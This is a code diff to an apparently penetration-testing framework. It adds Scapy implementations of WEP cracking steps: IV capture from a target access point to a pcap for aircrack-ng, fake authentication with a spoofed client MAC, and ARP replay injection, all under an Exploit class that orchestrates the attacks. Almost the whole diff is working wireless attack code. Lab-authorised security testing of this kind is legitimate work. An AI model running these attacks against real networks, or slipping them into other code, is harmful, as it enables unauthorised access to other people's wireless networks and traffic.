@@ -48,6 +48,7 @@ try:
         SNAP,
         sendp,
         sniff,
+        wrpcap,
     )
     SCAPY_AVAILABLE = True
 except ImportError:
@@ -692,6 +693,166 @@ def _interactive_replay_loop(
             time.sleep(0.01)
 
 
+def _capture_wep_ivs_scapy(
+    iface: str,
+    bssid: str,
+    target_ivs: int = 50000,
+    output_file: str = "/tmp/wep_capture.cap",
+) -> dict:
+    """Capture WEP IVs via native Scapy sniffing (blocking, single-call alternative).
+
+    Simpler blocking alternative to the threaded _capture_ivs_scapy. Sniffs
+    until target_ivs are collected or a 1-hour timeout expires, then writes
+    all packets to a pcap file readable by aircrack-ng.
+
+    Replaces airodump-ng IV capture for non-threaded use cases.
+
+    Args:
+        iface: Monitor mode interface.
+        bssid: Target AP BSSID.
+        target_ivs: Number of IVs to collect before stopping.
+        output_file: Output .cap file for aircrack-ng.
+
+    Returns:
+        Dict with: count(int), filename(str), ready_to_crack(bool).
+    """
+    # REFACTORED: removido airodump-ng - substituido por captura nativa Scapy
+    ivs: List[Tuple[bytes, bytes]] = []
+    all_pkts: List[object] = []
+    bssid_lower = bssid.lower()
+
+    def _process(pkt) -> None:
+        if pkt.haslayer(Dot11WEP):
+            dot11 = pkt.getlayer(Dot11)
+            if dot11 and (dot11.addr3 or "").lower() == bssid_lower:
+                wep = pkt[Dot11WEP]
+                iv_val = int(getattr(wep, "iv", 0))
+                iv = bytes([iv_val & 0xFF, (iv_val >> 8) & 0xFF, (iv_val >> 16) & 0xFF])
+                wepdata = bytes(getattr(wep, "wepdata", b"") or b"")
+                ivs.append((iv, wepdata))
+        all_pkts.append(pkt)
+
+    sniff(
+        iface=iface,
+        prn=_process,
+        store=False,
+        stop_filter=lambda _: len(ivs) >= target_ivs,
+        timeout=3600,
+    )
+
+    if all_pkts:
+        wrpcap(output_file, all_pkts)
+
+    return {
+        "count": len(ivs),
+        "filename": output_file,
+        "ready_to_crack": len(ivs) >= target_ivs,
+    }
+
+
+def _fake_auth_scapy(iface: str, bssid: str, client_mac: str, ssid: str) -> bool:
+    """Perform a one-shot fake open system authentication via Scapy.
+
+    Sends a single Dot11Auth (open system, seq 1) followed by a Dot11AssoReq
+    to associate with the target WEP AP. Use _fake_auth_loop for persistent
+    keepalive in threaded attack scenarios.
+
+    Replaces aireplay-ng -1 (fake authentication, one-shot).
+
+    Args:
+        iface: Monitor-mode interface with injection capability.
+        bssid: Target AP BSSID.
+        client_mac: Source MAC address to impersonate.
+        ssid: SSID of the target AP.
+
+    Returns:
+        True if frames were injected without error, False otherwise.
+    """
+    # REFACTORED: removido aireplay-ng -1 - substituido por implementacao nativa Scapy
+    try:
+        auth = (
+            RadioTap()
+            / Dot11(type=0, subtype=11, addr1=bssid, addr2=client_mac, addr3=bssid)
+            / Dot11Auth(algo=0, seqnum=1, status=0)
+        )
+        sendp(auth, iface=iface, verbose=False)
+        time.sleep(0.2)
+
+        assoc = (
+            RadioTap()
+            / Dot11(type=0, subtype=0, addr1=bssid, addr2=client_mac, addr3=bssid)
+            / Dot11AssoReq(cap=0x0431, listen_interval=10)
+            / Dot11Elt(ID="SSID", info=ssid.encode("utf-8") if ssid else b"")
+            / Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96")
+        )
+        sendp(assoc, iface=iface, verbose=False)
+        return True
+    except Exception as exc:
+        logger.debug("Fake auth (one-shot) injection error: %s", exc)
+        return False
+
+
+def _arp_replay_scapy(iface: str, bssid: str, count: int = 1000) -> int:
+    """Perform a bounded ARP replay attack via Scapy.
+
+    Captures one WEP-encrypted ARP frame from the target AP and replays it
+    count times to force the AP to generate new IVs. Use _arp_replay_loop
+    for continuous threaded replay.
+
+    ARP frames inside WEP have a characteristic encrypted payload of 32 to
+    54 bytes (28-byte ARP + 4-byte ICV, plus WEP overhead).
+
+    Replaces aireplay-ng -3 (ARP replay, bounded run).
+
+    Args:
+        iface: Monitor-mode interface with injection capability.
+        bssid: Target AP BSSID.
+        count: Number of replay injections.
+
+    Returns:
+        Number of frames successfully injected.
+    """
+    # REFACTORED: removido aireplay-ng -3 - substituido por implementacao nativa Scapy
+    bssid_lower = bssid.lower()
+    arp_frames: List[object] = []
+
+    def _find_arp(pkt) -> None:
+        if len(arp_frames) >= 1:
+            return
+        if not pkt.haslayer(Dot11WEP):
+            return
+        dot11 = pkt.getlayer(Dot11)
+        if dot11 is None or (dot11.addr3 or "").lower() != bssid_lower:
+            return
+        wepdata = bytes(getattr(pkt[Dot11WEP], "wepdata", b"") or b"")
+        if 32 <= len(wepdata) <= 54:
+            arp_frames.append(pkt)
+
+    sniff(
+        iface=iface,
+        prn=_find_arp,
+        timeout=30,
+        stop_filter=lambda _: len(arp_frames) >= 1,
+        store=False,
+    )
+
+    if not arp_frames:
+        logger.info("ARP replay (bounded): no suitable ARP frame captured within 30s")
+        return 0
+
+    injected = 0
+    for _ in range(count):
+        try:
+            sendp(arp_frames[0], iface=iface, verbose=False)
+            injected += 1
+        except Exception as exc:
+            logger.debug("ARP replay injection error: %s", exc)
+            break
+
+    logger.info("ARP replay (bounded): injected %d frames", injected)
+    return injected
+
+
 class Exploit(Exploit):
     """Orchestrate all WEP attack vectors with automatic IV capture and cracking."""
 
@@ -736,6 +897,8 @@ class Exploit(Exploit):
     max_time_s = OptInteger(1800, "Maximum total attack time in seconds (0 = unlimited)")
 
     dry_run = OptBool(False, "Print commands without executing")
+    # REFACTORED: removido airodump-ng - captura e injecao nativos via Scapy
+    native_mode = OptBool(True, "Use native Scapy for all IV capture and frame injection")
     i_know_scope = OptBool(False, "Confirm authorized lab environment")
 
     def _require_aircrack(self) -> Optional[str]:
